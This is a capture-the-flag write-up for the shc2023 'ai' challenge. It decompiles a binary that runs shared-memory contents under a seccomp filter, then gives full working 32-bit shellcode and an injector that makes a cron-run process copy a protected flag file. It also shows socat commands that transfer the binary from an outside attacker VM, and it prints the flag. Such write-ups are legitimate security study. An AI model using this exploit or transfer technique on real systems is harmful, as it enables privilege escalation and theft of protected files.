# ai

[library.m0unt41n.ch/challenges/ai](https://library.m0unt41n.ch/challenges/ai) ![](../../resources/pwn.svg) ![](../../resources/hard.svg) 

# TL;DR

Program creates - or attaches to - a shared memory segment and executes its contents
as a function. That code can only execute `mmap()` and `open()`, syscalls, but that is
enough for a successful exploit.

# Bringing back `gw`

First of all, we need to revive the exploit used in the
[gw](https://library.m0unt41n.ch/challenges/gw) challenge - the first step here is
to get the shell (as `gw` user) again.

# Peeking at the server

Already when solving the first challenge, I noticed `/tmp/ai_last_executed_time`. Let's peek a bit more:

```
$ uname -a
Linux gw 5.15.0-122-generic #132-Ubuntu SMP Thu Aug 29 13:45:52 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

$ cat /etc/issue.net
Ubuntu 18.04.6 LTS

$ tail -2 /etc/passwd
AI:x:1000:1000::/home/AI:/bin/sh
GW:x:1001:1001::/home/GW:/bin/sh

$ ls -lA /home
drwxr-xr-x 1 AI AI 4096 May 30 22:29 AI
drwxr-xr-x 1 GW GW 4096 May 30 22:29 GW

$ ls -lA /home/AI
-r-x---r-- 1 AI AI 5556 May 30 22:28 ai
-r-x--xr-x 1 AI AI 3764 May 30 22:28 filter.py
-r-------- 1 AI AI   38 May 30 22:28 flag
```

OK, so, we have `ai` binary, that we will analyze.

# ai

Decompiling the `ai` binary with IDA (plus quite a bit of manual tweaking, because I like
readable code &#128521;), I got:

```c
#include <fcntl.h>
#include <stddef.h>
#include <asm/unistd_32.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/mman.h>

int lockdown() {
    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD+BPF_W+BPF_ABS,  (offsetof(struct seccomp_data, nr))),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_open, 0, 1),
        BPF_STMT(BPF_RET+BPF_K,         SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_mmap, 0, 1),
        BPF_STMT(BPF_RET+BPF_K,         SECCOMP_RET_ALLOW),
        BPF_STMT(BPF_RET+BPF_K,         SECCOMP_RET_KILL_THREAD),
    };
    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
        .filter = filter,
    };

    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0))
        return 1;
    else
        return prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog) != 0;
}

void call_shmem(void (*fun_arg)(void)) {
    fun_arg();
}

int shm_key = 31337;
int shm_len = 100;

int main() {
    int shm_id = shmget(shm_key, shm_len, IPC_CREAT+S_IRWXU+S_IRWXG+S_IRWXO);
    void *shm_ptr = (void *)shmat(shm_id, 0, 0);
    mprotect(shm_ptr, shm_len, PROT_READ+PROT_WRITE+PROT_EXEC);
    if (lockdown()) return 1;
    call_shmem((void (*)(void))shm_ptr);
    return 0;
}
```

Overall, it seems that:

*   We can pre-create - or attach to an existing - `31337` (decimal) SHM ID block, as any program / user.
*   Whatever we write there, will be executed by `ai` (as `ai` user!) right before exit.
*   That shellcode can execute only `sys_open()` and `sys_mmap()` syscalls.
*   The shellcode code is limited to 100 bytes.

# More peeking on the server

With above analysis, it would make sense to see `ai` being periodically executed - and, likely, crashing,
until Somebody Does Something&#8482;. And indeed:

```bash
$ cat /etc/cron.d/ai.cron
* * * * * /home/AI/ai > /tmp/ai_last_executed_time

$ ls -la /tmp/ai_last_executed_time
-rw------- 1 AI AI 0 Oct 27 05:44 /tmp/ai_last_executed_time

$ ipcs -m
------ Shared Memory Segments --------
key        shmid      owner      perms      bytes      nattch     status      
0x00007a69 0          AI         777        100        0        
```

Note: `0x7a69` = `31337` in decimal.

So, there is a clear attack vector: create the payload, put it into the shmem segment,
wait for it to be executed.

The server has access to the internet (pre-requisite for
[gw](https://library.m0unt41n.ch/challenges/gw)) and has rudimentary GCC /
Python, but none of them are good enough to execute there (e.g. import `pwd`, craft shellcode,
etc.). It is also missing tools like `wget`, `curl` or `scp`.
But there is `socat` - and otherwise, we could always either use `/dev/tcp` trick or,
if all else fails, paste a tiny ELF as hex.

# Exploit

So, what can we do in these 100 bytes? How about:

*   Create a world-writable `/home/GW/flag` file (it is actually there, from the `gw`
    challenge, just needs a `chmod 666`)
*   Create a shellcode, which is down to:

    ```c
    fd = open("/home/AI/flag", O_RDONLY);
    void *src = mmap(fd, ...);
    fd = open("/home/GW/flag", O_RDWR);
    void *dst = mmap(fd, ...);
    memcpy(dst, src, FLAG_LEN);
    ```

On a 32-bit system, we will need to operate on `mmap_arg_struct`. Note that `unsigned long` is 32-bit here!

```c
mmap_arg_struct {
    unsigned long addr;
	unsigned long len;
	unsigned long prot;
	unsigned long flags;
	unsigned long fd;
	unsigned long offset;
}
```

The shellcode is straightforward, with just a bit of tightening to get it under the 100 byte limit
(mostly: LEAs and using EDX as zero). I could probably squeeze few bytes more &#128512;

```c
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/shm.h>

unsigned char opcodes[] = {
    /* Use EDX as zero through the code (shortens LEA opcodes) */
    0x31, 0xd2,                         // xor     edx,edx

    /* Store filename on stack */
    0x6a, 0x67,                         // push    0x67            ; "g\0"
    0x68, 0x2f, 0x66, 0x6c, 0x61,       // push    0x616c662f      ; "/fla"
    0x68, 0x65, 0x2f, 0x41, 0x49,       // push    0x49412f65      ; "e/AI"
    0x68, 0x2f, 0x68, 0x6f, 0x6d,       // push    0x6d6f682f      ; "/hom"

    /* struct mmap_arg_struct mmap_arg = {...} */
    0x52,                               // push    edx             ; .offset = 0
    0x52,                               // push    edx             ; .fd = 0
    0x6a, 0x01,                         // push    1               ; .flags = MAP_SHARED
    0x6a, 0x01,                         // push    1               ; .prot = PROT_READ
    0x6a, 0x26,                         // push    38              ; .len = 38
    0x52,                               // push    edx             ; .addr = NULL
    0x89, 0xe5,                         // mov     ebp,esp         ; EBP = mmap_arg

    /* mmap_arg.fd = sys_open("/home/AI/flag", O_RDWR, 0) */
    0x8d, 0x42, 0x05,                   // lea     eax, [edx+5]    ; __NR_open
    0x8d, 0x5d, 0x18,                   // lea     ebx, [ebp+24]   ; "/home/AI/flag"
    0x31, 0xc9,                         // xor     ecx, ecx        ; O_RDONLY
    0xcd, 0x80,                         // int     0x80            ; syscall
    0x89, 0x45, 0x10,                   // mov     [ebp+16], eax   ; mmap_arg.fd = fd

    /* void *src = sys_mmap(&mmap_arg) */
    0x8d, 0x42, 0x5a,                   // lea     eax, [edx+90]   ; __NR_mmap
    0x89, 0xeb,                         // mov     ebx, ebp        ; &mmap_arg
    0xcd, 0x80,                         // int     0x80            ; syscall
    0x89, 0xc6,                         // mov     esi, eax        ; ESI = src

    /* replace "AI" with "GW" in the string */
    0x66, 0xc7, 0x45, 0x1e, 0x47, 0x57, // mov     word ptr [ebp+30], 0x5747

    /* mmap_arg.fd = sys_open("/home/GW/flag", O_RDWR, 0) */
    0x8d, 0x42, 0x05,                   // lea     eax, [edx+5]    ; __NR_open
    0x8d, 0x5d, 0x18,                   // lea     ebx, [ebp+24]   ; "/home/GW/flag"
    0x8d, 0x4a, 0x02,                   // lea     ecx, [edx+2]    ; O_RDWR
    0xcd, 0x80,                         // int     0x80            ; syscall
    0x89, 0x45, 0x10,                   // mov     [ebp+16], eax   ; mmap_arg.fd = fd

    /* mmap_arg.prot = PROT_READ+PROT_WRITE */
    0xc6, 0x45, 0x08, 0x03,             // mov     byte ptr [ebp+8],3

    /* void *dst = sys_mmap(&mmap_arg) */
    0x8d, 0x42, 0x5a,                   // lea     eax, [edx+90]   ; __NR_MMAP
    0x89, 0xeb,                         // mov     ebx, ebp        ; &mmap_arg
    0xcd, 0x80,                         // int     0x80            ; syscall
    0x89, 0xc7,                         // mov     edi, eax        ; EDI = dst

    /* memcpy(dst, src, 38) */
    0x8d, 0x4a, 0x26,                   // lea     ecx, [edx+38]   ; file length
    0xf3, 0xa4,                         // rep     movsb

    /* exit(0) */
    0x8d, 0x42, 0x02,                   // lea     eax, [edx+2]    ; __NR_exit
    0xcd, 0x80,                         // int     0x80            ; syscall
};

int main() {
    int shm_id = shmget(31337, 100, IPC_CREAT+S_IRWXU+S_IRWXG+S_IRWXO);
    void *shm_ptr = (void *)shmat(shm_id, 0, 0);
    memcpy(shm_ptr, opcodes, sizeof(opcodes));
    printf("Payload size: %d bytes\n", sizeof(opcodes));
    return 0;
}
```

Tools used:

*   [shell-storm.org online assembler](https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=xor+++++edx%2Cedx%0D%0A%0D%0Apush++++0x67%0D%0Apush++++0x616c662f%0D%0Apush++++0x49412f65%0D%0Apush++++0x6d6f682f%0D%0A%0D%0Apush++++edx%0D%0Apush++++edx%0D%0Apush++++1%0D%0Apush++++1%0D%0Apush++++38%0D%0Apush++++edx%0D%0Amov+++++ebp%2Cesp%0D%0A%0D%0Alea+++++eax%2C+%5Bedx%2B5%5D%0D%0Alea+++++ebx%2C+%5Bebp%2B24%5D%0D%0Axor+++++ecx%2C+ecx%0D%0Aint+++++0x80%0D%0Amov+++++%5Bebp%2B16%5D%2C+eax%0D%0A%0D%0Alea+++++eax%2C+%5Bedx%2B90%5D%0D%0Amov+++++ebx%2C+ebp%0D%0Aint+++++0x80%0D%0Amov+++++esi%2C+eax%0D%0A%0D%0Amov+++++word+ptr+%5Bebp%2B30%5D%2C+0x5747%0D%0A%0D%0Alea+++++eax%2C+%5Bedx%2B5%5D%0D%0Alea+++++ebx%2C+%5Bebp%2B24%5D%0D%0Alea+++++ecx%2C+%5Bedx%2B2%5D%0D%0Aint+++++0x80%0D%0Amov+++++%5Bebp%2B16%5D%2C+eax%0D%0A%0D%0Amov+++++byte+ptr+%5Bebp%2B8%5D%2C3%0D%0A%0D%0Alea+++++eax%2C+%5Bedx%2B90%5D%0D%0Amov+++++ebx%2C+ebp%0D%0Aint+++++0x80%0D%0Amov+++++edi%2C+eax%0D%0A%0D%0Alea+++++ecx%2C+%5Bedx%2B38%5D%0D%0Arep+++++movsb%0D%0A%0D%0Alea+++++eax%2C+%5Bedx%2B2%5D%0D%0Aint+++++0x80&arch=x86-32&as_format=carray#assembly)
*   [syscalls.mebeim.net table for IA-32 ABI](https://syscalls.mebeim.net/?table=x86/32/ia32/latest)

That final `exit()` is not really relevant, because that syscall will fail for exactly
the same reasons as others (BPF filter). But, I like my code clean &#128578;


# Putting it to work

*   Compile the `inject` binary using a `i386/ubuntu:18.04` Docker image (or another system with
    the same C library):

    ```
    $ gcc -m32 -o inject inject.c
    ```
*   Serve it from the AWS VM (same as used for remote shell exploit):

    ```
    $ sudo socat FILE:inject TCP-LISTEN:80,reuseaddr
    ```
*   Download it on the remote SHC instance

    ```
    $ socat TCP:$AWS_IP:80 FILE:/tmp/inject,create
    $ chmod a+x /tmp/inject
    ```

*   Ensure that target flag file is exactly as we need it

    ```
    $ chmod 666 /home/GW/flag
    $ dd if=/dev/zero bs=38 count=1 of=/home/GW/flag
    $ ls -la /home/GW/flag
    -rw-rw-rw- 1 GW   GW      38 Oct 27 10:54 /home/GW/flag
    ```

*   Inject the shellcode into the shared memory segment

    ```
    $ /tmp/inject
    Payload size: 95 bytes
    ```

*   And, after a while...

    ```
    $ ls -la /home/GW/flag
    -rw-rw-rw- 1 GW   GW      38 Oct 27 10:57 /home/GW/flag

    $ cat /home/GW/flag
    shc2023{0p3n_4nd_mm4p_c4n_r34d_4_f1l3}
    ```


---

## `shc2023{0p3n_4nd_mm4p_c4n_r34d_4_f1l3}`




<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
